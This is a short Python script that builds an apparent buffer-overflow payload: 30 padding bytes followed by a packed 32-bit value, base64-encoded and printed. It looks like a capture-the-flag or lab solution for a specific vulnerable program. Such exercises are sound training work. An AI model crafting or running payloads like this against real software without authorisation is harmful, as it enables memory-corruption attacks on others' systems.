
import sys
import struct
import base64

buf = b'cccccccccccccccccccccccccccccc'
buf += struct.pack('<I', 2299424303)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
